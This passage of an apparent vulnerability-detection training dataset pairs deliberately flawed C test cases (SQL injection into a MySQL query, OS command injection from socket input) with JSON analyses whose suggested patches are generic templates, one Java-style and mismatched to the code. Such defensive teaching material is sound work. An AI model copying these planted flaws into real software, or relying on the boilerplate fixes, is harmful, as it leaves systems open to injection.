*)(g_type_check_instance_cast(((GTypeInstance *)window),((GType )(20 << 2))))),\"gimp-dialog-factory-min-size\")));\n}\n/*  private functions  */\n\nstatic GtkWidget *gimp_dialog_factory_constructor(GimpDialogFactory *factory,GimpDialogFactoryEntry *entry,GimpContext *context,GimpUIManager *ui_manager,gint view_size)\n{\n  GtkWidget *widget;\n  widget = ((entry -> new_func)(factory,context,ui_manager,view_size));\n/* The entry is for a dockable, so we simply need to put the created\n   * widget in a dockable\n   */\n  if (widget && entry -> dockable) {\n    GtkWidget *dockable = ((void *)0);\n    dockable = gimp_dockable_new((entry -> name),(entry -> blurb),(entry -> stock_id),(entry -> help_id));\n    gtk_container_add(((GtkContainer *)(g_type_check_instance_cast(((GTypeInstance *)dockable),gtk_container_get_type()))),widget);\n    gtk_widget_show(widget);\n/* EEK */\n    g_object_set_data(((GObject *)(g_type_check_instance_cast(((GTypeInstance *)dockable),((GType )(20 << 2))))),\"gimp-dialog-identifier\",(entry -> identifier));\n/* Return the dockable instead */\n    widget = dockable;\n  }\n  return widget;\n}\n\nstatic void gimp_dialog_factory_config_notify(GimpDialogFactory *factory,GParamSpec *pspec,GimpGuiConfig *config)\n{\n  GimpDialogsState state = gimp_dialog_factory_get_state(factory);\n  GimpDialogsState new_state = state;\n/* Make sure the state and config are in sync */\n  if (config -> hide_docks && state == GIMP_DIALOGS_SHOWN) {\n    new_state = GIMP_DIALOGS_HIDDEN_EXPLICITLY;\n  }\n  else {\n    if (!config -> hide_docks) {\n      new_state = GIMP_DIALOGS_SHOWN;\n    }\n  }\n  if (state != new_state) {\n    gimp_dialog_factory_set_state(factory,new_state);\n  }\n}\n\nstatic void gimp_dialog_factory_set_widget_data(GtkWidget *dialog,GimpDialogFactory *factory,GimpDialogFactoryEntry *entry)\n{\n  do {\n    if (({\n      GTypeInstance *__inst = (GTypeInstance *)dialog;\n      GType __t = gtk_widget_get_type();\n      gboolean __r;\n      if (!__inst) {\n        __r = 0;\n      }\n      else {\n        if (__inst -> g_class && __inst -> g_class -> g_type == __t) {\n          __r = !0;\n        }\n        else {\n          __r = g_type_check_instance_is_a(__inst,__t);\n        }\n      }\n      __r;\n    })) \n{\n    }\n    else {\n      g_return_if_fail_warning(\"Gimp-Widgets\",__PRETTY_FUNCTION__,\"GTK_IS_WIDGET (dialog)\");\n      return ;\n    }\n    ;\n  }while (0);\n  do {\n    if (({\n      GTypeInstance *__inst = (GTypeInstance *)factory;\n      GType __t = gimp_dialog_factory_get_type();\n      gboolean __r;\n      if (!__inst) {\n        __r = 0;\n      }\n      else {\n        if (__inst -> g_class && __inst -> g_class -> g_type == __t) {\n          __r = !0;\n        }\n        else {\n          __r = g_type_check_instance_is_a(__inst,__t);\n        }\n      }\n      __r;\n    })) \n{\n    }\n    else {\n      g_return_if_fail_warning(\"Gimp-Widgets\",__PRETTY_FUNCTION__,\"GIMP_IS_DIALOG_FACTORY (factory)\");\n      return ;\n    }\n    ;\n  }while (0);\n  if (!gimp_dialog_factory_key) {\n    gimp_dialog_factory_key = g_quark_from_static_string(\"gimp-dialog-factory\");\n    gimp_dialog_factory_entry_key = g_quark_from_static_string(\"gimp-dialog-factory-entry\");\n  }\n  g_object_set_qdata(((GObject *)(g_type_check_instance_cast(((GTypeInstance *)dialog),((GType )(20 << 2))))),gimp_dialog_factory_key,factory);\n  if (entry) {\n    g_object_set_qdata(((GObject *)(g_type_check_instance_cast(((GTypeInstance *)dialog),((GType )(20 << 2))))),gimp_dialog_factory_entry_key,entry);\n  }\n}\n\nstatic void gimp_dialog_factory_unset_widget_data(GtkWidget *dialog)\n{\n  do {\n    if (({\n      GTypeInstance *__inst = (GTypeInstance *)dialog;\n      GType __t = gtk_widget_get_type();\n      gboolean __r;\n      if (!__inst) {\n        __r = 0;\n      }\n      else {\n        if (__inst -> g_class && __inst -> g_class -> g_type == __t) {\n          __r = !0;\n        }\n        else {\n          __r = g_type_check_instance_is_a(__inst,__t);\n        }\n      }\n      __r;\n    })) \n{\n    }\n    else {\n      g_return_if_fail_warning(\"Gimp-Widgets\",__PRETTY_FUNCTION__,\"GTK_IS_WIDGET (dialog)\");\n      return ;\n    }\n    ;\n  }while (0);\n  if (!gimp_dialog_factory_key) {\n    return ;\n  }\n  g_object_set_qdata(((GObject *)(g_type_check_instance_cast(((GTypeInstance *)dialog),((GType )(20 << 2))))),gimp_dialog_factory_key,((void *)0));\n  g_object_set_qdata(((GObject *)(g_type_check_instance_cast(((GTypeInstance *)dialog),((GType )(20 << 2))))),gimp_dialog_factory_entry_key,((void *)0));\n}\n\nstatic gboolean gimp_dialog_factory_set_user_pos(GtkWidget *dialog,GdkEventConfigure *cevent,gpointer data)\n{\n  GdkWindowHints geometry_mask;\n/* Not only set geometry hints, also reset window position */\n  gtk_window_set_position(((GtkWindow *)(g_type_check_instance_cast(((GTypeInstance *)dialog),gtk_window_get_type()))),GTK_WIN_POS_NONE);\n  g_signal_handlers_disconnect_matched(dialog,(24),0,0,((void *)0),gimp_dialog_factory_set_user_pos,data);\n  do {\n    if (gimp_log_flags & GIMP_LOG_WM) {\n      gimp_log(GIMP_LOG_WM,((const char *)__func__),1329,\"setting GDK_HINT_USER_POS for %p\\n\",dialog);\n    }\n  }while (0);\n  geometry_mask = GDK_HINT_USER_POS;\n  if (gimp_dialog_factory_get_has_min_size(((GtkWindow *)(g_type_check_instance_cast(((GTypeInstance *)dialog),gtk_window_get_type()))))) {\n    geometry_mask |= GDK_HINT_MIN_SIZE;\n  }\n  gtk_window_set_geometry_hints(((GtkWindow *)(g_type_check_instance_cast(((GTypeInstance *)dialog),gtk_window_get_type()))),((void *)0),((void *)0),geometry_mask);\n  return 0;\n}\n\nstatic gboolean gimp_dialog_factory_dialog_configure(GtkWidget *dialog,GdkEventConfigure *cevent,GimpDialogFactory *factory)\n{\n  GimpDialogFactory *dialog_factory;\n  GimpDialogFactoryEntry *entry;\n  GList *list;\n  if (!g_list_find(factory -> p -> open_dialogs,dialog)) {\n    g_log(\"Gimp-Widgets\",G_LOG_LEVEL_WARNING,\"%s: dialog not registered\",((const char *)__func__));\n    return 0;\n  }\n  dialog_factory = gimp_dialog_factory_from_widget(dialog,&entry);\n  if (!gimp_dialog_factory_dialog_sane(factory,dialog_factory,entry,dialog)) {\n    return 0;\n  }\n  for (list = factory -> p -> session_infos; list; list = (list?((GList *)list) -> next : ((void *)0))) {\n    GimpSessionInfo *session_info = (list -> data);\n    if (gimp_session_info_get_widget(session_info) == dialog) {\n      gimp_session_info_read_geometry(session_info,cevent);\n      do {\n        if (gimp_log_flags & GIMP_LOG_DIALOG_FACTORY) {\n          gimp_log(GIMP_LOG_DIALOG_FACTORY,((const char *)__func__),1379,\"updated session info for \\\"%s\\\" from window geometry (x=%d y=%d  %dx%d)\",entry -> identifier,gimp_session_info_get_x(session_info),gimp_session_info_get_y(session_info),gimp_session_info_get_width(session_info),gimp_session_info_get_height(session_info));\n        }\n      }while (0);\n      break; \n    }\n  }\n  return 0;\n}\n\nvoid gimp_dialog_factory_save(GimpDialogFactory *factory,GimpConfigWriter *writer)\n{\n  GList *infos;\n  for (infos = factory -> p -> session_infos; infos; infos = (infos?((GList *)infos) -> next : ((void *)0))) {\n    GimpSessionInfo *info = (infos -> data);\n/*  we keep session info entries for all toplevel dialogs created\n       *  by the factory but don't save them if they don't want to be\n       *  managed\n       */\n    if (!gimp_session_info_is_session_managed(info) || gimp_session_info_get_factory_entry(info) == ((void *)0)) {\n      continue; \n    }\n    if (gimp_session_info_get_widget(info)) {\n      gimp_session_info_get_info(info);\n    }\n    gimp_config_writer_open(writer,\"session-info\");\n    gimp_config_writer_string(writer,gimp_object_get_name(factory));\n    (((GimpConfigInterface *)(g_type_interface_peek((((GTypeInstance *)info) -> g_class),gimp_config_interface_get_type()))) -> serialize)(((GimpConfig *)(g_type_check_instance_cast(((GTypeInstance *)info),gimp_config_interface_get_type()))),writer,((void *)0));\n    gimp_config_writer_close(writer);\n    if (gimp_session_info_get_widget(info)) {\n      gimp_session_info_clear_info(info);\n    }\n  }\n}\n\nvoid gimp_dialog_factory_restore(GimpDialogFactory *factory)\n{\n  GList *infos;\n  for (infos = factory -> p -> session_infos; infos; infos = (infos?((GList *)infos) -> next : ((void *)0))) {\n    GimpSessionInfo *info = (infos -> data);\n    if (gimp_session_info_get_open(info)) {\n      gimp_session_info_restore(info,factory);\n    }\n    else {\n      do {\n        if (gimp_log_flags & GIMP_LOG_DIALOG_FACTORY) {\n          gimp_log(GIMP_LOG_DIALOG_FACTORY,((const char *)__func__),1441,\"skipping to restore session info %p, not open\",info);\n        }\n      }while (0);\n    }\n  }\n}\n\nstatic void gimp_dialog_factory_hide(GimpDialogFactory *factory)\n{\n  GList *list;\n  for (list = factory -> p -> open_dialogs; list; list = (list?((GList *)list) -> next : ((void *)0))) {\n    GtkWidget *widget = (list -> data);\n    if ((({\n      GTypeInstance *__inst = (GTypeInstance *)widget;\n      GType __t = gtk_widget_get_type();\n      gboolean __r;\n      if (!__inst) {\n        __r = 0;\n      }\n      else {\n        if (__inst -> g_class && __inst -> g_class -> g_type == __t) {\n          __r = !0;\n        }\n        else {\n          __r = g_type_check_instance_is_a(__inst,__t);\n        }\n      }\n      __r;\n    })) && gtk_widget_is_toplevel(widget)) \n{\n      GimpDialogFactoryEntry *entry = ((void *)0);\n      GimpDialogVisibilityState visibility = GIMP_DIALOG_VISIBILITY_UNKNOWN;\n      gimp_dialog_factory_from_widget(widget,&entry);\n      if (!entry -> hideable) {\n        continue; \n      }\n      if (gtk_widget_get_visible(widget)) {\n        gtk_widget_hide(widget);\n        visibility = GIMP_DIALOG_VISIBILITY_HIDDEN;\n        do {\n          if (gimp_log_flags & GIMP_LOG_WM) {\n            gimp_log(GIMP_LOG_WM,((const char *)__func__),1471,\"Hiding '%s' [%p]\",gtk_window_get_title(((GtkWindow *)(g_type_check_instance_cast(((GTypeInstance *)widget),gtk_window_get_type())))),widget);\n          }\n        }while (0);\n      }\n      else {\n        visibility = GIMP_DIALOG_VISIBILITY_INVISIBLE;\n      }\n      g_object_set_data(((GObject *)(g_type_check_instance_cast(((GTypeInstance *)widget),((GType )(20 << 2))))),\"gimp-dialog-visibility\",((gpointer )((glong )visibility)));\n    }\n  }\n}\n\nstatic void gimp_dialog_factory_show(GimpDialogFactory *factory)\n{\n  GList *list;\n  for (list = factory -> p -> open_dialogs; list; list = (list?((GList *)list) -> next : ((void *)0))) {\n    GtkWidget *widget = (list -> data);\n    if ((({\n      GTypeInstance *__inst = (GTypeInstance *)widget;\n      GType __t = gtk_widget_get_type();\n      gboolean __r;\n      if (!__inst) {\n        __r = 0;\n      }\n      else {\n        if (__inst -> g_class && __inst -> g_class -> g_type == __t) {\n          __r = !0;\n        }\n        else {\n          __r = g_type_check_instance_is_a(__inst,__t);\n        }\n      }\n      __r;\n    })) && gtk_widget_is_toplevel(widget)) \n{\n      GimpDialogVisibilityState visibility;\n      visibility = ((gint )((glong )(g_object_get_data(((GObject *)(g_type_check_instance_cast(((GTypeInstance *)widget),((GType )(20 << 2))))),\"gimp-dialog-visibility\"))));\n      if (!gtk_widget_get_visible(widget) && visibility == GIMP_DIALOG_VISIBILITY_HIDDEN) {\n        do {\n          if (gimp_log_flags & GIMP_LOG_WM) {\n            gimp_log(GIMP_LOG_WM,((const char *)__func__),1507,\"Showing '%s' [%p]\",gtk_window_get_title(((GtkWindow *)(g_type_check_instance_cast(((GTypeInstance *)widget),gtk_window_get_type())))),widget);\n          }\n        }while (0);\n/* Don't use gtk_window_present() here, we don't want the\n               * keyboard focus to move.\n               */\n        gtk_widget_show(widget);\n        g_object_set_data(((GObject *)(g_type_check_instance_cast(((GTypeInstance *)widget),((GType )(20 << 2))))),\"gimp-dialog-visibility\",((gpointer )((glong )GIMP_DIALOG_VISIBILITY_VISIBLE)));\n        if (gtk_widget_get_visible(widget)) {\n          gdk_window_raise(gtk_widget_get_window(widget));\n        }\n      }\n    }\n  }\n}\n\nvoid gimp_dialog_factory_set_busy(GimpDialogFactory *factory)\n{\n  GdkDisplay *display = ((void *)0);\n  GdkCursor *cursor = ((void *)0);\n  GList *list;\n  if (!factory) {\n    return ;\n  }\n  for (list = factory -> p -> open_dialogs; list; list = (list?((GList *)list) -> next : ((void *)0))) {\n    GtkWidget *widget = (list -> data);\n    if ((({\n      GTypeInstance *__inst = (GTypeInstance *)widget;\n      GType __t = gtk_widget_get_type();\n      gboolean __r;\n      if (!__inst) {\n        __r = 0;\n      }\n      else {\n        if (__inst -> g_class && __inst -> g_class -> g_type == __t) {\n          __r = !0;\n        }\n        else {\n          __r = g_type_check_instance_is_a(__inst,__t);\n        }\n      }\n      __r;\n    })) && gtk_widget_is_toplevel(widget)) \n{\n      if (!display || display != gtk_widget_get_display(widget)) {\n        display = gtk_widget_get_display(widget);\n        if (cursor) {\n          gdk_cursor_unref(cursor);\n        }\n        cursor = gimp_cursor_new(display,GIMP_CURSOR_FORMAT_BITMAP,GIMP_HANDEDNESS_RIGHT,(150),GIMP_TOOL_CURSOR_NONE,GIMP_CURSOR_MODIFIER_NONE);\n      }\n      if (gtk_widget_get_window(widget)) {\n        gdk_window_set_cursor(gtk_widget_get_window(widget),cursor);\n      }\n    }\n  }\n  if (cursor) {\n    gdk_cursor_unref(cursor);\n  }\n}\n\nvoid gimp_dialog_factory_unset_busy(GimpDialogFactory *factory)\n{\n  GList *list;\n  if (!factory) {\n    return ;\n  }\n  for (list = factory -> p -> open_dialogs; list; list = (list?((GList *)list) -> next : ((void *)0))) {\n    GtkWidget *widget = (list -> data);\n    if ((({\n      GTypeInstance *__inst = (GTypeInstance *)widget;\n      GType __t = gtk_widget_get_type();\n      gboolean __r;\n      if (!__inst) {\n        __r = 0;\n      }\n      else {\n        if (__inst -> g_class && __inst -> g_class -> g_type == __t) {\n          __r = !0;\n        }\n        else {\n          __r = g_type_check_instance_is_a(__inst,__t);\n        }\n      }\n      __r;\n    })) && gtk_widget_is_toplevel(widget)) \n{\n      if (gtk_widget_get_window(widget)) {\n        gdk_window_set_cursor(gtk_widget_get_window(widget),((void *)0));\n      }\n    }\n  }\n}\n/**\n * gimp_dialog_factory_get_singleton:\n *\n * Returns: The toplevel GimpDialogFactory instance.\n **/\n\nGimpDialogFactory *gimp_dialog_factory_get_singleton()\n{\n  do {\n    if (gimp_toplevel_factory != ((void *)0)) {\n    }\n    else {\n      g_return_if_fail_warning(\"Gimp-Widgets\",__PRETTY_FUNCTION__,\"gimp_toplevel_factory != NULL\");\n      return ((void *)0);\n    }\n    ;\n  }while (0);\n  return gimp_toplevel_factory;\n}\n/**\n * gimp_dialog_factory_set_singleton:\n * @:\n *\n * Set the toplevel GimpDialogFactory instance. Must only be called by\n * dialogs_init()!.\n **/\n\nvoid gimp_dialog_factory_set_singleton(GimpDialogFactory *factory)\n{\n  do {\n    if (gimp_toplevel_factory == ((void *)0) || factory == ((void *)0)) {\n    }\n    else {\n      g_return_if_fail_warning(\"Gimp-Widgets\",__PRETTY_FUNCTION__,\"gimp_toplevel_factory == NULL || factory == NULL\");\n      return ;\n    }\n    ;\n  }while (0);\n  gimp_toplevel_factory = factory;\n}\n\nvoid frowstiest_bonny(char *const bonnyish_windbreak)\n{\n  int owercome_devastations = 7;\n  ++stonesoup_global_variable;;\n  acrite_absyrtus(owercome_devastations,bonnyish_windbreak);\n}\n\nvoid acrite_absyrtus(int entryways_terebate,char *horologium_chiasso)\n{\n  MYSQL_ROW stonesoup_row;\n  unsigned int stonesoup_num_fields;\n  my_ulonglong stonesoup_num_rows;\n  MYSQL_RES *stonesoup_result;\n  int stonesoup_i;\n  int stonesoup_status;\n  char stonesoup_query_buffer[1000];\n  MYSQL *stonesoup_conn;\n  unsigned int stonesoup_dbport = 0;\n  char *stonesoup_dbpassword = 0;\n  char *stonesoup_dbuser = 0;\n  char *stonesoup_dbhost = 0;\n  char * stonesoup_dbdatabase = 0;\n  char stonesoup_use_str[150] = {0};\n  char *chavel_compasser = 0;\n  ++stonesoup_global_variable;\n  entryways_terebate--;\n  if (entryways_terebate > 0) {\n    anorchism_presides(entryways_terebate,horologium_chiasso);\n    return ;\n  }\n  chavel_compasser = ((char *)((char *)horologium_chiasso));\n      tracepoint(stonesoup_trace, weakness_start, \"CWE089\", \"A\", \"Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')\");\n      stonesoup_dbhost = getenv(\"DBMYSQLHOST\");\n      stonesoup_dbuser = getenv(\"DBMYSQLUSER\");\n      stonesoup_dbpassword = getenv(\"DBMYSQLPASSWORD\");\n      stonesoup_dbport = ((unsigned int )(strtoul(getenv(\"DBMYSQLPORT\"),0,10)));\n      stonesoup_dbdatabase = getenv(\"SS_DBMYSQLDATABASE\");\n      tracepoint(stonesoup_trace, variable_buffer, \"stonesoup_dbhost\", stonesoup_dbhost, \"INITIAL-STATE\");\n      tracepoint(stonesoup_trace, variable_buffer, \"stonesoup_dbuser\", stonesoup_dbuser, \"INITIAL-STATE\");\n      tracepoint(stonesoup_trace, variable_buffer, \"stonesoup_dbpassword\", stonesoup_dbpassword, \"INITIAL-STATE\");\n      tracepoint(stonesoup_trace, variable_signed_integral, \"stonesoup_dbport\", stonesoup_dbport, &stonesoup_dbport, \"INITIAL-STATE\");\n      tracepoint(stonesoup_trace, variable_buffer, \"stonesoup_dbdatabase\", stonesoup_dbdatabase, \"INITIAL-STATE\");\n      if (stonesoup_dbhost != 0 && stonesoup_dbport != 0 && (stonesoup_dbuser != 0 && stonesoup_dbpassword != 0)) {\n          stonesoup_conn = mysql_init(0);\n          if (stonesoup_conn != 0) {\n            if (mysql_real_connect(stonesoup_conn,stonesoup_dbhost,stonesoup_dbuser,stonesoup_dbpassword,0,stonesoup_dbport,\"/var/lib/mysql/mysql.sock\",65536UL) != 0) {\n              snprintf(stonesoup_use_str,150,\"USE %s;\", stonesoup_dbdatabase);\n              if (mysql_query(stonesoup_conn, stonesoup_use_str) == 0) {\n                tracepoint(stonesoup_trace, trace_point, \"CROSSOVER-POINT: BEFORE\");\n/* STONESOUP: CROSSOVER-POINT (Sql Injection) */\n                snprintf(stonesoup_query_buffer,1000,\"SELECT * FROM Customers WHERE Country='%s';\",chavel_compasser);\n                tracepoint(stonesoup_trace, variable_buffer, \"stonesoup_query_buffer\", stonesoup_query_buffer, \"CROSSOVER-STATE\");\n                tracepoint(stonesoup_trace, trace_point, \"CROSSOVER-POINT: AFTER\");\n                tracepoint(stonesoup_trace, trace_point, \"TRIGGER-POINT: BEFORE\");\n/* STONESOUP: TRIGGER-POINT (Sql Injection) */\n                if (mysql_query(stonesoup_conn,stonesoup_query_buffer) == 0) {\n                  do {\n                    stonesoup_result = mysql_store_result(stonesoup_conn);\n                    if (stonesoup_result != 0) {\n                      stonesoup_num_rows = mysql_num_rows(stonesoup_result);\n                      if (stonesoup_num_rows != 0) {\n                        stonesoup_num_fields = mysql_num_fields(stonesoup_result);\n                        while((stonesoup_row = mysql_fetch_row(stonesoup_result))){\n                          for (stonesoup_i = 0; stonesoup_i < stonesoup_num_fields; ++stonesoup_i)\n                            stonesoup_printf(\"%s \",(stonesoup_row[stonesoup_i]?stonesoup_row[stonesoup_i] : \"NULL\"));\n                          stonesoup_printf(\"\\n\");\n                        }\n                        mysql_free_result(stonesoup_result);\n                      }\n                    }\n                    else {\n                      if (mysql_field_count(stonesoup_conn) == 0)\n                        stonesoup_printf(\"%lld rows affected\\n\",mysql_affected_rows(stonesoup_conn));\n                      else {\n                        stonesoup_printf(\"%s error %u: %s\\n\",\"Store result error\",mysql_errno(stonesoup_conn),mysql_error(stonesoup_conn));\n                        break;\n                      }\n                    }\n                    stonesoup_status = mysql_next_result(stonesoup_conn);\n                    if (stonesoup_status > 0)\n                      stonesoup_printf(\"%s error %u: %s\\n\",\"Next result error\",mysql_errno(stonesoup_conn),mysql_error(stonesoup_conn));\n                  }while (stonesoup_status == 0);\n                }\n                else {\n                  tracepoint(stonesoup_trace, trace_error, \"Query error\");\n                  stonesoup_printf(\"%s error %u: %s\\n\",\"Query\",mysql_errno(stonesoup_conn),mysql_error(stonesoup_conn));\n                }\n                tracepoint(stonesoup_trace, trace_point, \"TRIGGER-POINT: AFTER\");\n              }\n              else {\n                tracepoint(stonesoup_trace, trace_error, \"Query error\");\n                stonesoup_printf(\"%s error %u: %s\\n\",\"Query\",mysql_errno(stonesoup_conn),mysql_error(stonesoup_conn));\n              }\n              mysql_close(stonesoup_conn);\n            }\n            else {\n              tracepoint(stonesoup_trace, trace_error, \"Real connect error\");\n              stonesoup_printf(\"%s error %u: %s\\n\",\"Real connect\",mysql_errno(stonesoup_conn),mysql_error(stonesoup_conn));\n            }\n          }\n          else {\n            tracepoint(stonesoup_trace, trace_error, \"Init error\");\n            stonesoup_printf(\"%s error %u: %s\\n\",\"Init\",mysql_errno(stonesoup_conn),mysql_error(stonesoup_conn));\n          }\n      }\n      tracepoint(stonesoup_trace, weakness_end);\n;\n  if (((char *)horologium_chiasso) != 0) \n    free(((char *)((char *)horologium_chiasso)));\nstonesoup_close_printf_context();\n}\n\nvoid anorchism_presides(int klutzier_dalar,char *earlap_wat)\n{\n  ++stonesoup_global_variable;\n  acrite_absyrtus(klutzier_dalar,earlap_wat);\n}\n"}, {"role": "assistant", "content": "{\n  \"violation_type\": \"sql_injection\",\n  \"severity\": \"critical\",\n  \"explanation\": \"This code constructs SQL queries by concatenating user input directly into the query string. Attackers can manipulate input to execute malicious SQL commands.\",\n  \"risk\": \"Database compromise, data theft, data manipulation, authentication bypass\",\n  \"compliant_patch\": \"\\n// FIXED: Use prepared statements with parameterized queries\\n// Instead of: query = \\\"SELECT * FROM users WHERE name = '\\\" + user_input + \\\"'\\\"\\n// Use: query = \\\"SELECT * FROM users WHERE name = ?\\\"\\n//       stmt = connection.prepareStatement(query);\\n//       stmt.setString(1, user_input);\\n//       result = stmt.executeQuery();\\n\",\n  \"source\": \"SARD-152843\",\n  \"cwe\": \"CWE-89\"\n}"}]}
{"messages": [{"role": "system", "content": "You are a senior security engineer. Analyze the provided codebase snippet and output a detailed vulnerability explanation."}, {"role": "user", "content": "analyze this code for security violations:\n\n/* TEMPLATE GENERATED TESTCASE FILE\nFilename: CWE78_OS_Command_Injection__wchar_t_listen_socket_w32_spawnvp_68a.c\nLabel Definition File: CWE78_OS_Command_Injection.strings.label.xml\nTemplate File: sources-sink-68a.tmpl.c\n*/\n/*\n * @description\n * CWE: 78 OS Command Injection\n * BadSource: listen_socket Read data using a listen socket (server side)\n * GoodSource: Fixed string\n * Sink: w32_spawnvp\n *    BadSink : execute command with wspawnvp\n * Flow Variant: 68 Data flow: data passed as a global variable from one function to another in different source files\n *\n * */\n\n#include \"std_testcase.h\"\n\n#include <wchar.h>\n\n#ifdef _WIN32\n#define COMMAND_INT_PATH L\"%WINDIR%\\\\system32\\\\cmd.exe\"\n#define COMMAND_INT L\"cmd.exe\"\n#define COMMAND_ARG1 L\"/c\"\n#define COMMAND_ARG2 L\"dir \"\n#define COMMAND_ARG3 data\n#else /* NOT _WIN32 */\n#include <unistd.h>\n#define COMMAND_INT_PATH L\"/bin/sh\"\n#define COMMAND_INT L\"sh\"\n#define COMMAND_ARG1 L\"-c\"\n#define COMMAND_ARG2 L\"ls \"\n#define COMMAND_ARG3 data\n#endif\n\n#ifdef _WIN32\n#include <winsock2.h>\n#include <windows.h>\n#include <direct.h>\n#pragma comment(lib, \"ws2_32\") /* include ws2_32.lib when linking */\n#define CLOSE_SOCKET closesocket\n#else\n#include <sys/types.h>\n#include <sys/socket.h>\n#include <netinet/in.h>\n#include <arpa/inet.h>\n#define INVALID_SOCKET -1\n#define SOCKET_ERROR -1\n#define CLOSE_SOCKET close\n#define SOCKET int\n#endif\n\n#define TCP_PORT 27015\n#define LISTEN_BACKLOG 5\n\n#include <process.h>\n\nwchar_t * CWE78_OS_Command_Injection__wchar_t_listen_socket_w32_spawnvp_68_badData;\nwchar_t * CWE78_OS_Command_Injection__wchar_t_listen_socket_w32_spawnvp_68_goodG2BData;\n\n#ifndef OMITBAD\n\n/* bad function declaration */\nvoid CWE78_OS_Command_Injection__wchar_t_listen_socket_w32_spawnvp_68b_badSink();\n\nvoid CWE78_OS_Command_Injection__wchar_t_listen_socket_w32_spawnvp_68_bad()\n{\n    wchar_t * data;\n    wchar_t dataBuffer[100] = COMMAND_ARG2;\n    data = dataBuffer;\n    {\n#ifdef _WIN32\n        WSADATA wsaData;\n        int wsaDataInit = 0;\n#endif\n        int recvResult;\n        struct sockaddr_in service;\n        wchar_t *replace;\n        SOCKET listenSocket = INVALID_SOCKET;\n        SOCKET acceptSocket = INVALID_SOCKET;\n        size_t dataLen = wcslen(data);\n        do\n        {\n#ifdef _WIN32\n            if (WSAStartup(MAKEWORD(2,2), &wsaData) != NO_ERROR)\n            {\n                break;\n            }\n            wsaDataInit = 1;\n#endif\n            /* POTENTIAL FLAW: Read data using a listen socket */\n            listenSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);\n            if (listenSocket == INVALID_SOCKET)\n            {\n                break;\n            }\n            memset(&service, 0, sizeof(service));\n            service.sin_family = AF_INET;\n            service.sin_addr.s_addr = INADDR_ANY;\n            service.sin_port = htons(TCP_PORT);\n            if (bind(listenSocket, (struct sockaddr*)&service, sizeof(service)) == SOCKET_ERROR)\n            {\n                break;\n            }\n            if (listen(listenSocket, LISTEN_BACKLOG) == SOCKET_ERROR)\n            {\n                break;\n            }\n            acceptSocket = accept(listenSocket, NULL, NULL);\n            if (acceptSocket == SOCKET_ERROR)\n            {\n                break;\n            }\n            /* Abort on error or the connection was closed */\n            recvResult = recv(acceptSocket, (char *)(data + dataLen), sizeof(wchar_t) * (100 - dataLen - 1), 0);\n            if (recvResult == SOCKET_ERROR || recvResult == 0)\n            {\n                break;\n            }\n            /* Append null terminator */\n            data[dataLen + recvResult / sizeof(wchar_t)] = L'\\0';\n            /* Eliminate CRLF */\n            replace = wcschr(data, L'\\r');\n            if (replace)\n            {\n                *replace = L'\\0';\n            }\n            replace = wcschr(data, L'\\n');\n            if (replace)\n            {\n                *replace = L'\\0';\n            }\n        }\n        while (0);\n        if (listenSocket != INVALID_SOCKET)\n        {\n            CLOSE_SOCKET(listenSocket);\n        }\n        if (acceptSocket != INVALID_SOCKET)\n        {\n            CLOSE_SOCKET(acceptSocket);\n        }\n#ifdef _WIN32\n        if (wsaDataInit)\n        {\n            WSACleanup();\n        }\n#endif\n    }\n    CWE78_OS_Command_Injection__wchar_t_listen_socket_w32_spawnvp_68_badData = data;\n    CWE78_OS_Command_Injection__wchar_t_listen_socket_w32_spawnvp_68b_badSink();\n}\n\n#endif /* OMITBAD */\n\n#ifndef OMITGOOD\n\n/* good function declarations */\nvoid CWE78_OS_Command_Injection__wchar_t_listen_socket_w32_spawnvp_68b_goodG2BSink();\n\n/* goodG2B uses the GoodSource with the BadSink */\nstatic void goodG2B()\n{\n    wchar_t * data;\n    wchar_t dataBuffer[100] = COMMAND_ARG2;\n    data = dataBuffer;\n    /* FIX: Append a fixed string to data (not user / external input) */\n    wcscat(data, L\"*.*\");\n    CWE78_OS_Command_Injection__wchar_t_listen_socket_w32_spawnvp_68_goodG2BData = data;\n    CWE78_OS_Command_Injection__wchar_t_listen_socket_w32_spawnvp_68b_goodG2BSink();\n}\n\nvoid CWE78_OS_Command_Injection__wchar_t_listen_socket_w32_spawnvp_68_good()\n{\n    goodG2B();\n}\n\n#endif /* OMITGOOD */\n\n/* Below is the main(). It is only used when building this testcase on\n * its own for testing or for building a binary to use in testing binary\n * analysis tools. It is not used when compiling all the testcases as one\n * application, which is how source code analysis tools are tested.\n */\n\n#ifdef INCLUDEMAIN\n\nint main(int argc, char * argv[])\n{\n    /* seed randomness */\n    srand( (unsigned)time(NULL) );\n#ifndef OMITGOOD\n    printLine(\"Calling good()...\");\n    CWE78_OS_Command_Injection__wchar_t_listen_socket_w32_spawnvp_68_good();\n    printLine(\"Finished good()\");\n#endif /* OMITGOOD */\n#ifndef OMITBAD\n    printLine(\"Calling bad()...\");\n    CWE78_OS_Command_Injection__wchar_t_listen_socket_w32_spawnvp_68_bad();\n    printLine(\"Finished bad()\");\n#endif /* OMITBAD */\n    return 0;\n}\n\n#endif\n"}, {"role": "assistant", "content": "{\n  \"violation_type\": \"os_command_injection\",\n  \"severity\": \"critical\",\n  \"explanation\": \"This code allows untrusted input to be executed as operating system commands. Attackers can exploit this to execute arbitrary commands on the server with the application's privileges.\",\n  \"risk\": \"Complete system compromise, arbitrary command execution, data theft, system modification\",\n  \"compliant_patch\": \"\\n// FIXED: Use parameterized commands or input validation\\n// Instead of: system(user_input)\\n// Use: validated_input = validate_user_input(user_input);\\n//       system(escape_shell_command(validated_input));\\n\\n// Or better, use library functions that handle arguments safely:\\n// execvp() with proper argument array\\n// or use higher-level APIs that avoid shell entirely\\n\",\n  \"source\": \"SARD-248715\",\n  \"cwe\": \"CWE-78\"\n}"}]}
